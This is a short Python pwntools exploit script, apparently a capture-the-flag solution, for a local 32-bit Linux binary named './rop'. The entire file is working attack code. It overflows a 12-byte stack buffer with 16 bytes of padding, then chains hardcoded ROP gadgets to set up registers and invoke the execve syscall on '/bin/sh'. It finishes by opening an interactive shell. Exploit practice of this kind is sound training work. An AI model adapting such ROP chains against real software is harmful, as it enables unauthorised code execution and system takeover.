#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

# Address of /bin/sh string in data section
addr_bin_sh = 0x0804a008
addr_junk = 0xdeadbeef

# ROP gadget addresses from gogodaaget() function
gadget_pop_eax = 0x080491fa
gadget_pop_ebx = 0x080491fc
gadget_pop_ecx = 0x08049204
gadget_zero_edx1 = 0x0804920b
gadget_zero_edx2 = 0x08049212
gadget_int_80 = 0x08049214

# Build payload
payload = b'A' * 16  # Padding to reach return address (12 bytes buffer + 4 bytes saved EBP)

# Construct ROP chain
rop_chain = [
    gadget_pop_eax,      # pop eax; ret
    0x0b,                # execve syscall number
    gadget_pop_ecx,      # pop ecx; mov ebx, 0xffffffff; ret
    0x0,                 # NULL for argv
    gadget_pop_ebx,      # pop ebx; mov esi, 0x64; pop edi; ret
    addr_bin_sh,         # pointer to "/bin/sh"
    addr_junk,           # junk value for pop edi
    gadget_zero_edx1,    # mov edx, 0; inc edx; ret
    gadget_zero_edx2,    # dec edx; ret (now edx = 0)
    gadget_int_80,       # int 0x80; nop; nop; ret
]

payload += flat(rop_chain)

info(f"Payload length: {len(payload)}")

# Execute exploit
p = process('./rop')
p.sendline(payload)
p.interactive()

